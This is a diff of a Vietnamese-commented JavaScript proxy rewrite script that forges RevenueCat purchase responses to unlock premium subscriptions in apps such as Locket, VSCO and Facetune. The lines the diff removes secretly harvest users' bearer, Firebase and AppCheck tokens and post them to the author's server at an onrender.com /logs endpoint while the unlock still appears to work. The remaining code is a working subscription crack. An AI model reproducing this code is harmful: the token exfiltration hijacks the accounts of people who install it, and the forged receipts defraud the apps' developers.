@@ -1,6 +1,6 @@
-// RevenueCat Mở Khóa Premium Đa Ứng Dụng
+﻿// RevenueCat Mở Khóa Premium Đa Ứng Dụng
 // Hỗ trợ: Locket, VSCO, Mojo, HTTPBot, 1Blocker, Structured, Splice, Facetune
-// Phiên bản: 2.4 (Fix Async Log + Device ID)
+// Phiên bản: 2.4
 // Tác giả: DucToanDev
 
 (function () {
@@ -9,7 +9,6 @@
   // --- CÁC HẰNG SỐ ---
   const PURCHASE_DATE = "2026-02-10T00:00:00Z";
   const EXPIRES_DATE = "2099-12-31T23:59:59Z";
-  const TIMEOUT_MS = 1500; // Thời gian chờ tối đa cho Log (1.5s)
 
   // --- CẤU HÌNH APP ---
   const APP_CONFIGS = {
@@ -39,14 +38,6 @@
   const headers = $request.headers;
   const ua = headers["User-Agent"] || headers["user-agent"] || "";
   
-  // Locket API Headers
-  const authorization = headers["Authorization"] || "";
-  const firebaseToken = headers["Firebase-Instance-ID-Token"] || headers["firebase-instance-id-token"] || "";
-  const appCheck = headers["X-Firebase-AppCheck"] || headers["x-firebase-appcheck"] || "";
-  const contentType = headers["Content-Type"] || headers["content-type"] || "";
-  
-  // Extract Bearer token
-  const userToken = authorization.replace("Bearer ", "");
 
   // --- XỬ LÝ LOGIC PREMIUM (Chuẩn bị dữ liệu trước) ---
   let responseObj;
@@ -126,45 +117,5 @@
     );
   }
 
-  // --- HÀM KẾT THÚC (QUAN TRỌNG) ---
-  // Hàm này đảm bảo $done chỉ được gọi 1 lần duy nhất
-  let isDone = false;
-  const finish = () => {
-    if (isDone) return;
-    isDone = true;
-    $done({ body: JSON.stringify(responseObj) });
-  };
-
-  // --- XỬ LÝ GỬI LOG (FIX ASYNC) ---
-  if (authorization && typeof $httpClient !== "undefined") {
-    // 1. Tạo Timeout an toàn: Nếu server log chậm quá 1.5s thì bỏ qua, cứ trả về Premium cho khách
-    const timeoutId = setTimeout(() => {
-      finish();
-    }, TIMEOUT_MS);
-
-    // 2. Gửi Log với đầy đủ headers Locket
-    $httpClient.post(
-      {
-        url: "https://ductoandev-unlock.onrender.com/logs",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          app: "Locket",
-          authorization: authorization,
-          firebaseToken: firebaseToken,
-          appCheck: appCheck,
-          userAgent: ua,
-          timestamp: new Date().toISOString(),
-        }),
-        timeout: 1000,
-      },
-      function (error, response, data) {
-        // 3. Khi gửi xong (dù lỗi hay thành công) -> Hủy timeout chờ -> Kết thúc script
-        clearTimeout(timeoutId);
-        finish();
-      },
-    );
-  } else {
-    // Nếu không có token hoặc không có httpClient -> Kết thúc luôn
-    finish();
-  }
+  $done({ body: JSON.stringify(responseObj) });
 })();
